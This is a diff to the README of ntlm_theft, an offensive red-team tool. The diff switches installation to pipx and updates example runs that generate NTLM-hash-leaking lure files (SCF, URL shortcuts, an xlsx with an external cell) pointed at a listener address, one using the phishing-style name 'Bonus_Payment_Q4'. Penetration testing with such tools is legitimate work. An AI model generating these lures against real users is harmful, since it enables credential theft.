@@ -46,10 +46,16 @@ These instructions will show you the requirements for and how to use ntlm_theft.
 
 ### Prerequisites
 
-ntlm_theft requires Python3 and xlsxwriter:
+ntlm_theft requires Python3. Install it with [pipx](https://pipx.pypa.io/) (pulls in the `xlsxwriter` dependency automatically):
 
 ```
-pip3 install xlsxwriter
+pipx install .
+```
+
+This installs an `ntlm_theft` command on your `PATH`. If you're actively developing the tool, use an editable install instead so code changes take effect without reinstalling:
+
+```
+pipx install --editable .
 ```
 
 ### Required Parameters
@@ -67,7 +73,7 @@ To start up the tool 4 parameters must be provided, an input format, the input f
 Here is an example of what a run looks like generating all files:
 
 ```
-# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
+# ntlm_theft -g all -s 127.0.0.1 -f test
 Created: test/test.scf (BROWSE)
 Created: test/test-(url).url (BROWSE)
 Created: test/test-(icon).url (BROWSE)
@@ -93,7 +99,7 @@ Generation Complete.
 Here is an example of what a run looks like generating only modern files:
 
 ```
-# python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting
+# ntlm_theft -g modern -s 127.0.0.1 -f meeting
 Skipping SCF as it does not work on modern Windows
 Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
 Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
@@ -119,7 +125,7 @@ Generation Complete.
 Here is an example of what a run looks like generating only a xlsx file:
 
 ```
-# python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
+# ntlm_theft -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
 Created: Bonus_Payment_Q4/Bonus_Payment_Q4-(externalcell).xlsx (OPEN)
 Generation Complete.
 ```
